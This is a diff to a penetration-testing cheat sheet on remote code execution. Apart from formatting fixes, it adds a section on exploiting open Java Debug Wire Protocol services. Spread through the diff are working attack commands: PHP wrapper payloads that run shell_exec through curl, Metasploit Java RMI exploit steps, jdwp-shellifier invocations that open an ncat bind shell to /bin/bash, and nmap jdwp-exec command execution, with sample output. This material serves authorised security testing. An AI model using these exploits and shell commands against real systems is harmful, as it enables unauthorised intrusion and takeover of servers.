@@ -32,7 +32,8 @@
 - [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASPNET-ViewState-deserialization-in-NET-Web-applications)
 - [Technique 5 - RCE by exploiting PHP wrappers in PHP Web applications](#Technique-5-RCE-by-exploiting-PHP-wrappers-in-PHP-Web-applications)
 - [Technique 6 - RCE by exploiting insecure Java Remote Method Invocation APIs (Java RMI)](#Technique-6-RCE-by-exploiting-insecure-Java-Remote-Method-Invocation-APIs-Java-RMI)
-- Technique 7 - ...
+- [Technique 7 - RCE by exploiting an open Java Debug Wire Protocol (JDWP) interface](#Technique-7-RCE-by-exploiting-an-open-Java-Debug-Wire-Protocol-JDWP-interface)
+- Technique 8 - ...
 
 #### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
 #### IV. Usefull Github links for Webshells [LINK](#IV-Usefull-Github-links-for-Webshells)
@@ -224,7 +225,7 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 ➤ Step 7. Execute OS commands using the Webshell 
            - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
 ```
-#### Technique 5. Webshell upload using a SPLUNK web administration console
+#### Technique 5. Webshell upload using a SPLUNK Web administration console
 ```
 ➤ Step 1. Download a Webshell customized for Splunk
 	   - https://github.com/dionach/Splunk-Web-Shell
@@ -704,14 +705,14 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              NOTE: the payload is "<?php system($_GET['cmd']);?>"
 
 ➤ Example 2 - Wrapper php://input
-  -----------------------------
+  -------------------------------
    + Requirement: The attribute allow_url_include must be set. This configuration can be checked in the php.ini file.
    + Examples:
            - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
            - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?parameter=php://input"
 
 ➤ Example 3 - Wrapper php://expect
-  -----------------------------
+  --------------------------------
    + Requirement: The expect wrapper doesn't required the allow_url_include configuration, the expect extension is required instead.
    + Examples:
            - curl --user-agent "AUDIT" "https://example.com/index.php?page=expect://whoami"
@@ -884,7 +885,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              uid=0(root) gid=0(root) groups=0(root)
 
 
-           + Example 3 - RCE using Metasploit
+           + Example 4 - RCE using Metasploit
              --------------------------------
 	     use exploit/multi/misc/java_rmi_server
 	     RHOSTS <IPs>
@@ -892,7 +893,45 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 	     # configure also the payload if needed
 	     run
 ```
+#### Technique 7. RCE by exploiting an open Java Debug Wire Protocol (JDWP) interface
+<i/>Note: The Java Debug Wire Protocol lacks of authentication and encryption mechanisms.</i>
+```
+➤ Step 1. Use the NMAP port scanner to discover a Java Debug Wire Protocol (JDWP) interface exposed on your target network.
+          Examples:
+	   $ nmap -sV <target-IP> -p 0-65535
+	     <SNIP>
+	     PORT     STATE SERVICE VERSION
+	     8000/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.6.0_17
 
+	   $ nmap-sT <target> -p <port> --script=+jdwp-info
+	     PORT     STATE SERVICE REASON
+	     2010/tcp open  search  syn-ack
+	     | jdwp-info:
+	     |   Available processors: 4
+	     |   Free memory: 15331736
+	     <SNIP>
+	     |   Name of the OS: Windows 2016
+	     <SNIP>
+	     |   java version 1.8.0_421
+	     <SNIP>
+
+➤ Step 2. Exploit the open JWDP service to perform a remote code execution (RCE) and compromise the underlying server
+
+	   + Example 1 - Using the tool "jdwp-shellifier" (https://github.com/IOActive/jdwp-shellifier)
+	     $ ./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' 					# Exec something
+	     $ ./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash'   # Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
+
+	   + Example 2 - Using the NSE NMAP script "jdwp-exec" which allows to inject and execute a Java class file that executes the supplied shell command and returns its output.
+	     $ nmap -sT <target> -p <port> --script=+jdwp-exec --script-args cmd="date"
+	     <SNIP>
+	     PORT     STATE SERVICE REASON
+	     8000/tcp open  search  syn-ack
+	     | jdwp-exec:
+	     |   date output:
+	     |   Sat Aug 19 12:21:11 Central European Daylight Time 2016
+	     |_
+
+```
 -----------------
 
 ### III. List of common paths for the DocumentRoot directory (Web root directory)
